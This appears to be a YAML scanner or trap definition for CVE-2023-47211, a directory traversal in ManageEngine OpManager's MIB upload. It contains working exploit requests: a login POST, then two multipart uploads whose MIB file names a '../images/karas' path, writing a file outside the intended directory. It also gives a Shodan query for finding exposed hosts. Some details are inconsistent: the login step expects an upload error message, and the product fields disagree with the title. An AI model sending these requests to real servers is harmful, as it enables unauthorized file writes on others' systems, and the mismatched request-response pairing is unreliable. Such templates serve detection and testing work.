id: CVE-2023-47211
info:
  name: ManageEngine OpManager - Directory Traversal
  author: gy741
  description: 'A directory traversal vulnerability exists in the uploadMib functionality
    of ManageEngine OpManager 12.7.258. A specially crafted HTTP request can lead
    to arbitrary file creation. An attacker can send a malicious MiB file to trigger
    this vulnerability.

    '
  severity: high
  reference:
  - https://talosintelligence.com/vulnerability_reports/TALOS-2023-1851
  - https://nvd.nist.gov/vuln/detail/CVE-2023-47211
  - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
    cvss-score: 8.6
    cve-id: CVE-2023-47211
    cwe-id: CWE-22
    epss-score: 0.00164
    epss-percentile: 0.52059
    cpe: cpe:2.3:a:zohocorp:manageengine_firewall_analyzer:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: zohocorp
    product: manageengine_firewall_analyzer
    shodan-query: http.title:"OpManager Plus"
  tags: cve,cve2023,zoho,manageengine,authenticated,traversal,lfi,intrusive
traps:
- request:
    method: POST
    path: /two_factor_auth
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'j_username={{username}}&j_password={{password}}

      '
  response:
    status_code: 200
    headers: {}
    body: MIBFile with same name already exists
- request:
    method: POST
    path: /client/api/json/mibbrowser/uploadMib
    headers:
      X-ZCSRF-TOKEN: opmcsrftoken={{x_zcsrf_token}}
      Content-Type: multipart/form-data; boundary=---------------------------372334936941313273904263503262
    body: |
      -----------------------------372334936941313273904263503262
      Content-Disposition: form-data; name="mibFile"; filename="karas.txt"
      Content-Type: text/plain

      ../images/karas DEFINITIONS ::= BEGIN


      IMPORTS
          enterprises
              FROM RFC1155-SMI;

      microsoft       OBJECT IDENTIFIER ::= { enterprises 311 }
      software        OBJECT IDENTIFIER ::= { microsoft 1 }
      systems         OBJECT IDENTIFIER ::= { software 1 }
      os              OBJECT IDENTIFIER ::= { systems 3 }
      windowsNT       OBJECT IDENTIFIER ::= { os 1 }
      windows         OBJECT IDENTIFIER ::= { os 2 }
      workstation     OBJECT IDENTIFIER ::= { windowsNT 1 }
      server          OBJECT IDENTIFIER ::= { windowsNT 2 }
      dc              OBJECT IDENTIFIER ::= { windowsNT 3 }

      END

      -----------------------------372334936941313273904263503262--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /client/api/json/mibbrowser/uploadMib
    headers:
      X-ZCSRF-TOKEN: opmcsrftoken={{x_zcsrf_token}}
      Content-Type: multipart/form-data; boundary=---------------------------372334936941313273904263503262
    body: |
      -----------------------------372334936941313273904263503262
      Content-Disposition: form-data; name="mibFile"; filename="karas.txt"
      Content-Type: text/plain

      ../images/karas DEFINITIONS ::= BEGIN


      IMPORTS
          enterprises
              FROM RFC1155-SMI;

      microsoft       OBJECT IDENTIFIER ::= { enterprises 311 }
      software        OBJECT IDENTIFIER ::= { microsoft 1 }
      systems         OBJECT IDENTIFIER ::= { software 1 }
      os              OBJECT IDENTIFIER ::= { systems 3 }
      windowsNT       OBJECT IDENTIFIER ::= { os 1 }
      windows         OBJECT IDENTIFIER ::= { os 2 }
      workstation     OBJECT IDENTIFIER ::= { windowsNT 1 }
      server          OBJECT IDENTIFIER ::= { windowsNT 2 }
      dc              OBJECT IDENTIFIER ::= { windowsNT 3 }

      END

      -----------------------------372334936941313273904263503262--
  response:
    status_code: 200
    headers: {}
    body: ''
